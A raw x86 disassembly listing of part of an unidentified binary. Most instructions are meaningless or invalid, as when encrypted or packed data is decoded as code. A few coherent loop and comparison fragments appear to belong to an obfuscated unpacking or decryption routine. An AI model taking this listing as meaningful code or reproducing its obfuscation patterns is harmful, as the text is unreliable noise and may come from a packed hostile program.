  4072d5:	test   eax,0x92be53f
  4072da:	stos   DWORD PTR es:[edi],eax
  4072db:	aas    
  4072dc:	ja     0x4072bd
  4072de:	aaa    
  4072df:	std    
  4072e0:	or     BYTE PTR [edi+eiz*8],dh
  4072e3:	rol    BYTE PTR [ebx],1
  4072e5:	imul   DWORD PTR [ebp-0x6c9caaa9]
  4072eb:	mov    cl,0xfd
  4072ed:	sar    dh,1
  4072ef:	sbb    al,BYTE PTR [ebx]
  4072f1:	dec    esp
  4072f2:	xchg   ecx,eax
  4072f3:	xor    esi,eax
  4072f5:	sub    ecx,DWORD PTR [eax]
  4072f7:	je     0x4072b0
  4072f9:	nop
  4072fa:	xor    ecx,DWORD PTR [edx+edi*2+0x2b51058c]
  407301:	and    al,0x2d
  407303:	pop    esp
  407304:	test   al,0xba
  407306:	sub    esp,DWORD PTR [ebx+ebp*4]
  407309:	mov    bh,0x4e
  40730b:	mov    ecx,0xc67cfeb6
  407310:	fimul  DWORD PTR es:[edi]
  407313:	(bad)  
  407315:	mov    eax,DWORD PTR [ebp-0x8]
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430546
  40732a:	sub    DWORD PTR ds:0x43049a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e762,0x4304aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4304b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x3602235c]
  40736c:	jno    0x40738c
  40736e:	sti    
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x407376
  407378:	dec    ecx
  407379:	fsubrp st(6),st
  40737b:	xchg   ebx,eax
  40737c:	enter  0x4483,0xe1
  407380:	adc    BYTE PTR [ebx+0x2d],dh
  407383:	retf   0xf1f
  407386:	les    eax,FWORD PTR [ebx]
  407388:	in     al,0x1a
  40738a:	mov    ds:0x7bb332d9,eax
  40738f:	loopne 0x407382
  407391:	xchg   esi,eax
  407392:	outs   dx,DWORD PTR ds:[esi]
  407393:	fwait
  407394:	pop    edi
  407395:	dec    eax
  407396:	cmp    edi,DWORD PTR [esi+ebp*1+0x4a]
  40739a:	sub    al,0x3e
  40739c:	pop    ecx
  40739d:	mov    eax,ds:0x830e1b59
  4073a2:	add    al,0xfc
  4073a4:	push   eax
  4073a5:	adc    al,0xc8
  4073a7:	xchg   edi,eax
  4073a8:	sbb    BYTE PTR [ecx+0x7a],al
  4073ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ac:	call   0x93ebbdd5
  4073b1:	pop    ebx
  4073b2:	sahf   
  4073b3:	add    eax,ebp
  4073b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073b6:	dec    esi
  4073b7:	rcr    DWORD PTR [edx*4+0x68032e7c],1
  4073be:	jl     0x407386
  4073c0:	ficomp WORD PTR [edi-0x2d]
  4073c3:	or     dl,BYTE PTR [ebx+edi*1-0x55cb2f0d]
  4073ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073cb:	ret    
  4073cc:	xchg   ecx,eax
  4073cd:	jnp    0x4073dd
  4073cf:	sub    DWORD PTR [esp+esi*2-0x6f],eax
  4073d3:	mov    edx,0x77f3084a
  4073d8:	sub    eax,0x2aeb929
  4073dd:	ja     0x407388
  4073df:	push   ebx
  4073e0:	push   cs
  4073e1:	fucomp st(5)
  4073e3:	mov    edi,0x2b6e5be9
  4073e8:	ror    BYTE PTR [edx-0x41],1
  4073eb:	mul    bh
  4073ed:	push   edi
  4073ee:	mov    esi,0x804fb3b5
  4073f3:	xor    esp,DWORD PTR [edx-0x6c]
  4073f6:	xchg   ecx,eax
  4073f7:	pop    edx
  4073f8:	inc    esp
  4073f9:	mov    ds:0xf063b44c,eax
  4073fe:	out    dx,eax
  4073ff:	shr    BYTE PTR [esi],0x18
  407402:	int    0x52
  407404:	mov    ebx,0x77be0084
  407409:	imul   ebp,DWORD PTR [ecx+esi*2+0x2ac02983],0x24fa981c
  407414:	inc    BYTE PTR [esi-0x32]
  407417:	data16 or al,0x82
  40741a:	inc    ecx
  40741b:	and    al,0x42
  40741d:	push   ecx
  40741e:	and    BYTE PTR [edx-0x5d117193],al
  407424:	xor    BYTE PTR [ecx+0x69ee8056],dh
  40742a:	rcl    BYTE PTR [edi],cl
  40742c:	xor    dl,BYTE PTR [edx]
  40742e:	or     eax,0x96618b22
  407433:	pop    esp
  407434:	popa   
  407435:	sti    
  407436:	loope  0x4074ab
  407438:	(bad)  
  407439:	lock (bad) 
  40743b:	sub    cl,dh
  40743d:	xchg   BYTE PTR [esi+eax*4-0x43],dl
  407441:	mov    ds:0x85f0048e,eax
  407446:	stos   BYTE PTR es:[edi],al
  407447:	sbb    al,0x67
  407449:	lea    eax,[edx+0x70893cbf]
  40744f:	jg     0x40749d
  407451:	ret    
  407452:	and    DWORD PTR [eax-0x50ec6812],ebp
  407458:	xor    cl,BYTE PTR [esi+0x30]
  40745b:	fs aam 0xfd
  40745e:	or     al,0xc8
  407460:	inc    esi
  407461:	(bad)  
  407462:	mov    ds,WORD PTR [ebp+0x56]
  407465:	xchg   DWORD PTR ds:0x471ef005,edx
  40746b:	imul   esi,DWORD PTR [ebx+0x253e6749],0xe7e97345
  407475:	xor    ecx,ebp
  407477:	popf   
  407478:	or     DWORD PTR [edi],eax
  40747a:	push   ss
  40747b:	not    BYTE PTR [edi]
  40747d:	jbe    0x4074fd
  40747f:	sub    dh,BYTE PTR [eax+0x3963516f]
  407485:	(bad)  
  407486:	cwde   
  407487:	inc    esi
  407488:	std    
  407489:	(bad)  
  40748a:	adc    edx,esp
  40748c:	lods   al,BYTE PTR ds:[esi]
  40748d:	push   esi
  40748e:	cmp    bl,bh
  407490:	ss add al,0x2d
  407493:	push   es
  407494:	or     edi,esi
  407496:	pop    ebx
  407497:	sub    al,0x17
  407499:	test   BYTE PTR [ebx+0x5fe62e0d],0x76
  4074a0:	xchg   edx,eax
  4074a1:	das    
  4074a2:	push   0x64e09560
  4074a7:	jbe    0x40751b
  4074a9:	add    esp,DWORD PTR [ecx]
  4074ab:	mov    bl,0xe4
  4074ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074ae:	hlt    
  4074af:	xchg   edi,eax
  4074b0:	nop
  4074b1:	mov    edx,0x12df80ec
  4074b6:	mov    bh,bh
  4074b8:	pop    edx
  4074b9:	add    bh,BYTE PTR [edi-0x7b00e82c]
  4074bf:	mov    ecx,0x1cbc4b49
  4074c4:	push   edi
  4074c5:	add    DWORD PTR [esp+ebx*1-0x174bb577],ebp
  4074cc:	cli    
  4074cd:	std    
  4074ce:	dec    edi
  4074cf:	outs   dx,BYTE PTR ds:[esi]
  4074d0:	(bad)  
  4074d1:	pushf  
  4074d2:	inc    ecx
  4074d3:	lds    edx,FWORD PTR [eax+0x65]
  4074d6:	mov    DWORD PTR gs:[edx],ecx
  4074d9:	addr16 popf 
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	xchg   edx,eax
  40750a:	push   es
  40750b:	push   0xffffffea
  40750d:	in     eax,dx
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x4074ab
  407516:	hlt    
  407517:	scas   eax,DWORD PTR es:[edi]
  407518:	push   edx
  407519:	jnp    0x40753a
  40751b:	aam    0xef
  40751d:	outs   dx,BYTE PTR ds:[esi]
  40751e:	loope  0x407567
  407520:	fnstsw WORD PTR [edx+0x3258d207]
  407526:	clc    
  407527:	out    0xab,eax
  407529:	or     dl,BYTE PTR [eax-0x2bdea0c2]
  40752f:	mov    ah,0x87
  407531:	xchg   DWORD PTR [ebx-0x27de3d53],edx
  407537:	imul   esi,DWORD PTR [esi],0x1f53b255
  40753d:	mov    al,0x11
  40753f:	xor    edi,DWORD PTR [edi]
  407541:	test   bh,dl
  407543:	fwait
  407544:	popf   
  407545:	mov    esp,0x9caca27b
  40754a:	add    edi,DWORD PTR [edi-0x75227481]
  407550:	out    dx,eax
  407551:	or     BYTE PTR [edi],cl
  407553:	dec    ebp
  407554:	dec    esp
  407555:	mov    dl,0x1e
  407557:	pop    esp
  407558:	(bad)  
  407559:	sar    DWORD PTR [ebp+0x58],cl
  40755c:	mov    al,0x39
  40755e:	mov    ds:0xb5513979,al
  407563:	add    ebx,DWORD PTR [edi-0x45]
  407566:	xchg   edx,eax
  407567:	popf   
  407568:	mul    DWORD PTR cs:[edi-0x3f2f76d7]
  40756f:	xor    edx,DWORD PTR [ebp-0x23]
  407572:	dec    ebx
  407573:	sbb    BYTE PTR [eax+0x50],cl
  407576:	jle    0x407536
  407578:	daa    
  407579:	inc    ecx
  40757a:	jmp    0x4075b5
  40757c:	dec    edi
  40757d:	pusha  
  40757e:	scas   eax,DWORD PTR es:[edi]
  40757f:	into   
  407580:	out    0x11,al
  407582:	fdivr  QWORD PTR [ebx]
  407584:	push   es
  407585:	repnz inc esi
  407587:	ror    DWORD PTR [ebx-0x4d],0xe4
  40758b:	cmc    
  40758c:	repz mov ds:0x74c5377f,al
  407592:	jb     0x40753e
  407594:	mov    eax,0xe023f987
  407599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40759a:	je     0x40753f
  40759c:	shl    BYTE PTR [edi],1
  40759e:	adc    al,0xb3
  4075a0:	mov    esp,0x5e056cf5
  4075a5:	aaa    
  4075a6:	aas    
  4075a7:	cmp    eax,0x9096c3a3
  4075ac:	test   al,0x35
  4075ae:	ror    ebp,0x2
  4075b1:	cmp    al,0x59
  4075b3:	pop    es
  4075b4:	dec    edi
  4075b5:	add    edi,DWORD PTR [ebx+ecx*2+0x43]
  4075b9:	aas    
  4075ba:	adc    eax,eax
  4075bc:	dec    ebx
  4075bd:	jo     0x4075ed
  4075bf:	sti    
  4075c0:	loope  0x40760e
  4075c2:	mov    ebx,0xfbbf0572
  4075c7:	icebp  
  4075c8:	mov    bl,0x54
  4075ca:	les    edx,FWORD PTR [eax-0x148f7a11]
  4075d0:	dec    edi
  4075d1:	mov    ebx,0xf78bf629
  4075d6:	add    BYTE PTR [esi],dh
  4075d8:	test   al,0x41
  4075da:	jnp    0x4075b8
  4075dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075dd:	mov    eax,ds:0x8dc12127
  4075e2:	(bad)  
  4075e3:	push   edi
  4075e4:	shl    DWORD PTR [esi-0x79],1
  4075e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075e8:	dec    eax
  4075e9:	or     eax,0x98dde8e1
  4075ee:	dec    edi
  4075ef:	mov    ebx,DWORD PTR [ecx]
  4075f1:	xchg   dl,ah
  4075f3:	loopne 0x40758f
  4075f5:	dec    ecx
  4075f6:	inc    edi
  4075f7:	scas   al,BYTE PTR es:[edi]
  4075f8:	cmp    eax,0x956ccaa4
  4075fd:	push   0x3503051a
  407602:	iret   
  407603:	jg     0x407623
  407605:	sub    al,0xf2
  407607:	dec    esi
  407608:	mov    edx,0x21e183b1
  40760d:	stos   BYTE PTR es:[edi],al
  40760e:	out    0x69,eax
  407610:	pop    ds
  407611:	lock (bad) 
  407613:	dec    ebx
  407614:	push   ds
  407615:	fstp   DWORD PTR [edi+0xf]
  407618:	sub    DWORD PTR [esi-0x1a],esp
  40761b:	inc    eax
  40761c:	test   BYTE PTR [eax+ebp*8-0x50],bl
  407620:	in     al,dx
  407621:	lea    edi,[eax+ebx*1]
  407624:	xchg   ebp,eax
  407625:	and    eax,0x25fe208c
  40762a:	mov    esi,0x948a738d
  40762f:	xor    DWORD PTR [ecx+0x4698589e],ecx
  407635:	fwait
  407636:	dec    ebp
  407637:	div    DWORD PTR [eax-0x8c43ea8]
  40763d:	pop    esp
  40763e:	ss fwait
  407640:	mov    edi,DWORD PTR [edx]
  407642:	fstp   st(2)
  407644:	and    al,0x65
  407646:	int    0x3f
  407648:	es push 0xffffffb5
  40764b:	inc    ecx
  40764c:	sub    DWORD PTR [edx],ebp
  40764e:	dec    ebp
  40764f:	jg     0x4075e2
  407651:	or     DWORD PTR [edx],ebx
  407653:	in     eax,dx
  407654:	fst    DWORD PTR [ecx+0x1]
  407657:	xor    al,0xf0
  407659:	mov    edx,0xc9a11796
  40765e:	jnp    0x40767b
  407660:	pop    esp
  407661:	push   0xffffff86
  407663:	into   
  407664:	test   eax,0x44555aab
  407669:	dec    eax
  40766a:	and    al,0xf
  40766c:	sub    BYTE PTR [eax+0x48],dh
  40766f:	xor    cl,ah
  407671:	lock xchg esi,eax
  407673:	sub    dh,BYTE PTR [ecx]
  407675:	xchg   DWORD PTR [edi+0x72],edi
  407678:	mov    al,0x8b
  40767a:	jge    0x407684
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	and    DWORD PTR [edi+edi*2+0x15],0x41
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x407621
  40769a:	xchg   edi,eax
  40769b:	jno    0x4076ea
  40769d:	ret    
  40769e:	ins    DWORD PTR es:[edi],dx
  40769f:	jl     0x407714
  4076a1:	ds jmp 0x40769c
  4076a4:	sub    al,0xf3
  4076a6:	xchg   ecx,eax
  4076a7:	pusha  
  4076a8:	mov    ch,0x2c
  4076aa:	xor    al,0x81
  4076ac:	xor    bl,BYTE PTR [eax]
  4076ae:	imul   ebp,DWORD PTR [edx+0x44],0x6a0f69e
  4076b5:	pusha  
  4076b6:	sub    bl,BYTE PTR [eax+0x61]
  4076b9:	dec    ebx
  4076ba:	adc    eax,0xc80afbf4
  4076bf:	xor    BYTE PTR [edx+0x7135b74d],al
  4076c5:	out    0x7,eax
  4076c7:	fwait
  4076c8:	mov    ebp,0xb41223c7
  4076cd:	mov    esi,0xef65aa28
  4076d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d3:	fisttp WORD PTR [esi]
  4076d5:	pop    edx
  4076d6:	sbb    esp,0xffffffe2
  4076d9:	fyl2x  
  4076db:	in     eax,dx
  4076dc:	pop    edx
  4076dd:	adc    eax,0x54ac89a2
  4076e2:	ss (bad) 
  4076e4:	aam    0xfa
  4076e6:	jae    0x4076bd
  4076e8:	and    BYTE PTR [esi+0x914f100],bl
  4076ee:	xor    BYTE PTR [ebp-0x6bb2c881],dh
  4076f4:	or     DWORD PTR [eax+0x3b],0xc9220130
  4076fb:	mov    edx,0x98db3de9
  407700:	mov    ah,BYTE PTR [eax-0x58]
  407703:	mov    ds,WORD PTR [esi+ebx*2-0x43202271]
  40770a:	mov    ebx,DWORD PTR [eax-0x67fefd19]
  407710:	dec    edx
  407711:	cmp    esi,DWORD PTR [esi]
  407713:	(bad)  
  407715:	mov    gs,WORD PTR [eax+0x4157c940]
  40771b:	mov    ebp,ds
  40771d:	mov    edi,0x9cf5c407
  407722:	and    al,0xa8
  407724:	inc    esp
  407725:	loopne 0x4076ed
  407727:	loop   0x407742
  407729:	push   edx
  40772a:	test   eax,0x8370826f
  40772f:	adc    edx,esp
  407731:	jb     0x4076c0
  407733:	imul   esi,DWORD PTR [ebp+0x2e3c109c],0xffffff95
  40773a:	rcr    DWORD PTR [ecx],0x8e
  40773d:	inc    eax
  40773e:	cmc    
  40773f:	mov    BYTE PTR [ebx],cl
  407741:	in     eax,0x8d
  407743:	xchg   ebx,eax
  407744:	gs iret 
  407746:	in     eax,dx
  407747:	(bad)  
  407748:	push   esp
  407749:	push   esp
  40774a:	sub    eax,0x1ee06e5d
  407750:	or     edx,edx
  407752:	pop    esp
  407753:	enter  0x62fe,0x53
  407757:	retf   0xe5d9
  40775a:	in     eax,0xe5
  40775c:	push   ecx
  40775d:	pop    esp
  40775e:	mov    ah,dh
  407760:	inc    edi
  407761:	jecxz  0x407725
  407763:	jl     0x40770e
  407765:	adc    BYTE PTR [ecx+0x50],dh
  407768:	out    0x23,al
  40776a:	sub    dh,cl
  40776c:	mov    al,0x30
  40776e:	jbe    0x407751
  407770:	mov    dl,BYTE PTR [eax+0x77]
  407773:	add    bh,ch
  407775:	jge    0x4077a3
  407777:	xchg   ecx,eax
  407778:	aad    0x89
  40777a:	mov    al,0x35
  40777c:	cmc    
  40777d:	jmp    0xc89ce1e0
  407782:	or     eax,0xa7e28393
  407787:	sti    
  407788:	out    0xba,al
  40778a:	call   0xb05bfcdf
  40778f:	sbb    BYTE PTR [edi+0x11],ah
  407792:	mov    cl,0x3f
  407794:	call   0xf3b3d3c3
  407799:	dec    ebp
  40779a:	mov    esi,0x6768d566
  40779f:	lods   eax,DWORD PTR ds:[esi]
  4077a0:	ret    
  4077a1:	enter  0x1041,0x7f
  4077a5:	dec    ebx
  4077a6:	je     0x407792
  4077a8:	inc    ecx
  4077a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077aa:	icebp  
  4077ab:	and    ebp,DWORD PTR es:[ebp-0xf]
  4077af:	inc    esp
  4077b0:	push   edx
  4077b1:	inc    edx
  4077b2:	stos   BYTE PTR es:[edi],al
  4077b3:	add    eax,0x69be9671
  4077b8:	loop   0x407769
  4077ba:	pop    es
  4077bb:	sbb    al,0xa0
  4077bd:	inc    esp
  4077be:	aam    0x65
  4077c0:	xor    DWORD PTR ds:0x6241305c,ebx
  4077c6:	pop    eax
  4077c7:	fiadd  WORD PTR [ebx-0x2bc760d7]
  4077cd:	ja     0x4077b2
  4077cf:	xchg   ebp,eax
  4077d0:	inc    ebp
  4077d1:	arpl   sp,di
  4077d3:	fcmovbe st,st(0)
  4077d5:	sahf   
  4077d6:	xchg   ecx,eax
  4077d7:	adc    bh,BYTE PTR [edx-0x79c279ff]
  4077dd:	ins    DWORD PTR es:[edi],dx
  4077de:	cld    
  4077df:	stos   DWORD PTR es:[edi],eax
  4077e0:	cmp    BYTE PTR [edi-0x67],dh
  4077e3:	dec    esp
  4077e5:	mov    al,BYTE PTR [edi+0x6fb48d82]
  4077eb:	fidivr WORD PTR ds:0xfa644ed6
  4077f1:	(bad)  
  4077f3:	xchg   ecx,eax
  4077f4:	sub    al,0xc6
  4077f6:	mov    cl,BYTE PTR [esi+0x5b236663]
  4077fc:	(bad)  
  4077fd:	mov    eax,0x8a40
  407802:	xor    ax,WORD PTR [edi+edx*4+0x2]
  407807:	mov    edi,0x3b06
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	stc    
  407821:	ror    BYTE PTR [ebp+ebx*4+0x7e7ec325],1
  407828:	sar    BYTE PTR [edi+0x7e],cl
  40782b:	jle    0x40789c
  40782d:	mov    dh,0x3a
  40782f:	(bad)  
  407830:	fiadd  DWORD PTR [edx+0x5a]
  407833:	scas   eax,DWORD PTR es:[edi]
  407834:	rol    al,1
  407836:	test   al,0x68
  407838:	mov    ds:0x59fa696f,eax
  40783d:	adc    BYTE PTR cs:[edi+0x66],dh
  407841:	in     eax,0xa
  407843:	inc    ebp
  407844:	stos   DWORD PTR es:[edi],eax
  407845:	fs je  0x40788c
  407848:	not    BYTE PTR [ecx+0x24]
  40784b:	and    DWORD PTR [edx-0x78],ebx
  40784e:	xchg   edi,eax
  40784f:	int3   
  407850:	(bad)  
  407851:	out    dx,al
  407852:	fnstenv [eax+0x78290b30]
  407858:	dec    ebp
  407859:	add    ch,BYTE PTR [edx]
  40785b:	cmp    eax,0x32711fc8
  407860:	inc    ebx
  407861:	fidivr DWORD PTR [edi+ebp*8]
  407864:	clc    
  407865:	cmp    BYTE PTR [edx-0x1b],bh
  407868:	mov    eax,ds:0x14a1449c
  40786d:	popa   
  40786e:	jge    0x4078d6
  407870:	add    BYTE PTR [ebx],bl
  407872:	mov    dh,0x13
  407874:	jp     0x407868
  407876:	shr    ah,1
  407878:	push   0xffffffc7
  40787a:	ror    BYTE PTR [ebx],1
  40787c:	rcl    esp,1
  40787e:	sub    eax,0xb9846f24
  407883:	inc    edx
  407884:	arpl   WORD PTR [ecx],dx
  407886:	xchg   cl,dh
  407888:	sahf   
  407889:	loope  0x4078ef
  40788b:	mov    ecx,0x69cb3168
  407890:	push   esp
  407891:	pop    ebp
  407892:	xchg   esp,eax
  407893:	arpl   WORD PTR [edi-0x71ef3e3d],cx
  407899:	iret   
  40789a:	aam    0x1
  40789c:	cmp    DWORD PTR [ecx-0x22],edx
  40789f:	cmp    al,dh
  4078a1:	lea    edx,[ecx]
  4078a3:	gs shr edx,0x2e
  4078a7:	mov    dh,0x13
  4078a9:	jecxz  0x407858
  4078ab:	stc    
  4078ac:	jp     0x407840
  4078ae:	int3   
  4078af:	mov    edx,0x157da0ed
  4078b4:	cwde   
  4078b5:	and    BYTE PTR [ebx-0x33f69ad9],ch
  4078bb:	inc    edi
  4078bc:	fs hlt 
  4078be:	imul   ebp,DWORD PTR [edi-0x7a4bc846],0x893224cb
  4078c8:	shl    BYTE PTR [ebx+0x4c2ccad1],1
  4078ce:	les    eax,FWORD PTR [ebx+0x16]
  4078d1:	or     DWORD PTR [esi-0x7a],0x73
  4078d5:	in     al,dx
  4078d6:	jg     0x407915
  4078d8:	hlt    
  4078d9:	sti    
  4078da:	int    0xf9
  4078dc:	ins    DWORD PTR es:[edi],dx
  4078dd:	ret    0x18bc
  4078e0:	or     BYTE PTR [ebx-0x4777e140],0x80
  4078e7:	fsub   QWORD PTR ds:0xb5c39c7d
  4078ed:	xchg   esp,eax
  4078ee:	test   eax,0xa0cd59f9
  4078f3:	ds lock mov ah,0x30
  4078f7:	cmp    al,BYTE PTR [eax]
  4078f9:	add    al,0x72
  4078fb:	xor    al,0x71
  4078fd:	je     0x40796f
  4078ff:	aas    
  407900:	sub    BYTE PTR [ebp-0x62f5d21e],0x93
  407907:	or     DWORD PTR [ebx-0x34],ebp
  40790a:	push   esp
  40790b:	mov    ch,0xa
  40790d:	jecxz  0x40795c
  40790f:	and    DWORD PTR [esi+0x1b],ecx
  407912:	les    edi,FWORD PTR [ebp+0x57e25e9e]
  407918:	int3   
  407919:	xchg   esi,eax
  40791a:	shr    BYTE PTR [ecx+0x688176e9],cl
  407920:	jb     0x407980
  407922:	sbb    BYTE PTR [edx-0x56],al
  407925:	xchg   edx,eax
  407926:	int3   
  407927:	aad    0x84
  407929:	push   esp
  40792a:	sahf   
  40792b:	xchg   ebx,eax
  40792c:	lods   eax,DWORD PTR ds:[esi]
  40792d:	in     ax,0xb7
  407930:	and    cl,BYTE PTR [ebx+eax*8-0x148af74f]
  407937:	dec    edx
  407938:	stc    
  407939:	mov    WORD PTR [eax],?
  40793b:	adc    al,0x76
  40793d:	xor    eax,0x1e7b5a2e
  407942:	adc    ah,ch
  407944:	std    
  407945:	xor    eax,0x7535ed1f
  40794a:	sub    edi,DWORD PTR [esi-0x3a]
  40794d:	lea    ecx,[edx-0x62]
  407950:	cmp    cl,cl
  407952:	add    ecx,DWORD PTR [eax-0x30]
  407955:	jecxz  0x4079bc
  407957:	imul   edx,DWORD PTR [edi+0x4e],0xffffffc4
  40795b:	bound  ebp,QWORD PTR ds:0x363b1dca
  407961:	js     0x4079e0
  407963:	jg     0x407994
  407965:	adc    eax,ebx
  407967:	test   al,0xa8
  407969:	ja     0x4078f2
  40796b:	cmp    esp,eax
  40796d:	mov    ds:0xaeb33483,al
  407972:	mov    bl,0xc9
  407974:	pusha  
  407975:	adc    bl,0x71
  407978:	push   edx
  407979:	outs   dx,DWORD PTR cs:[esi]
  40797b:	hlt    
  40797c:	sub    BYTE PTR [edi-0x98a6273],bl
  407982:	pop    edi
  407983:	test   DWORD PTR [edx-0x5c],ebp
  407986:	mov    ds:0xd398ab6,eax
  40798b:	xor    DWORD PTR [eax+0x43],ebx
  40798e:	ret    0xf06
  407991:	mov    bh,0xc0
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	push   ebx
  4079a8:	pop    esp
  4079a9:	push   0x3d
  4079ab:	cdq    
  4079ac:	les    edi,FWORD PTR [esi+0x7e]
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x4079e1
  4079b4:	ds xchg ebx,eax
  4079b6:	mov    edi,0x9c17bd34
  4079bb:	mov    bl,0x9d
  4079bd:	in     eax,0x5c
  4079bf:	add    ebp,DWORD PTR [edx-0x24]
  4079c2:	aas    
  4079c3:	shl    BYTE PTR [edi-0x1fc56387],cl
  4079c9:	fidiv  DWORD PTR [ecx]
  4079cb:	xor    DWORD PTR [ebp+0x65],ecx
  4079ce:	push   edi
  4079cf:	aas    
  4079d0:	xor    ch,0xc4
  4079d3:	pop    ebp
  4079d4:	out    0x2f,eax
  4079d6:	and    DWORD PTR [esi+0x1e94f18b],ebp
  4079dc:	mov    dh,0x2f
  4079de:	(bad)  
  4079df:	push   edi
  4079e0:	mov    ds:0x94968bde,al
  4079e5:	push   ecx
  4079e6:	out    0x31,eax
  4079e8:	mov    ecx,ecx
  4079ea:	sub    DWORD PTR [edx+0x694f38ff],0x82438810
  4079f4:	or     esi,ecx
  4079f6:	jnp    0x4079f1
  4079f8:	push   esp
  4079f9:	jecxz  0x4079dc
  4079fb:	test   eax,0x2dccad94
  407a00:	ss int3 
  407a02:	pop    esp
  407a03:	jle    0x407993
  407a05:	mov    al,0x39
  407a07:	xor    al,0x9b
  407a09:	call   0x5ff7:0x340f3971
  407a10:	sbb    al,BYTE PTR [edx+0x1c]
  407a13:	test   eax,0x931693b9
  407a18:	jp     0x407a63
  407a1a:	lock (bad) 
  407a1c:	mov    ebp,0xba87fc1e
  407a21:	add    eax,0xa025da85
  407a26:	sub    al,0x8b
  407a28:	neg    DWORD PTR [esi-0x52]
  407a2b:	iret   
  407a2c:	mov    WORD PTR [esi-0x66],ds
  407a2f:	sub    eax,0xb05d5f5
  407a34:	das    
  407a35:	sbb    eax,0xf8846184
  407a3a:	add    DWORD PTR [ebx+edi*8+0x14],edx
  407a3e:	shr    DWORD PTR [edi],cl
  407a40:	mov    edx,0x34b50bce
  407a45:	jecxz  0x407ab9
  407a47:	mov    ecx,0xfec7bbb7
  407a4c:	or     eax,0xa590fa55
  407a51:	jmp    0x407aac
  407a53:	mov    ds:0x2b347600,al
  407a58:	or     eax,0x3e3e9089
  407a5d:	repnz sahf 
  407a5f:	jnp    0x407a1a
  407a61:	xor    dl,BYTE PTR [ebx-0x7c1e6074]
  407a67:	das    
  407a68:	xchg   DWORD PTR [eax],edx
  407a6a:	push   eax
  407a6b:	cmp    DWORD PTR [esi+0x5da234c1],esi
  407a71:	mov    eax,ds:0xb43eeb23
  407a76:	in     eax,0x3e
  407a78:	jge    0x407a5d
  407a7a:	xor    BYTE PTR [edx+eax*1+0x61cf79ef],ah
  407a81:	jecxz  0x407a24
  407a83:	and    ecx,ebx
  407a85:	mov    ebp,0x3c2f951b
  407a8a:	adc    esi,ecx
  407a8c:	fldl2e 
  407a8e:	mov    ch,0xd2
  407a90:	shl    BYTE PTR [edi+edx*4+0xadbb1e4],1
  407a97:	sub    DWORD PTR [edx],ecx
  407a99:	jne    0x407a24
  407a9b:	clc    
  407a9c:	or     DWORD PTR [esi-0x4],ebx
  407a9f:	test   dh,0xe7
  407aa2:	adc    ah,BYTE PTR [esi+0xb6e6607]
  407aa8:	popa   
  407aa9:	clc    
  407aaa:	mov    al,BYTE PTR [ebp+0x22]
  407aad:	and    DWORD PTR [ebp+0x69],edi
  407ab0:	jmp    0xcb3a7e30
  407ab5:	and    BYTE PTR [eax-0x7],0x26
  407ab9:	push   ecx
  407aba:	pop    ss
  407abb:	fmul   QWORD PTR [ebx+ebx*1]
  407abe:	dec    ebx
  407abf:	adc    esp,DWORD PTR [esp+eax*8-0x31357d90]
  407ac6:	ja     0x407abd
  407ac8:	mov    ecx,0xae153bd4
  407acd:	out    dx,eax
  407ace:	mov    esp,0x1341bff6
  407ad3:	std    
  407ad4:	xlat   BYTE PTR ds:[ebx]
  407ad5:	retf   0xfd32
  407ad8:	les    esp,FWORD PTR [edx-0x388aea5b]
  407ade:	cwde   
  407adf:	gs sub eax,0x5bf3e268
  407ae5:	outs   dx,BYTE PTR ds:[esi]
  407ae6:	jns    0x407ab6
  407ae8:	adc    BYTE PTR [ebx+0x625417ef],ch
  407aee:	xor    al,BYTE PTR [ebx]
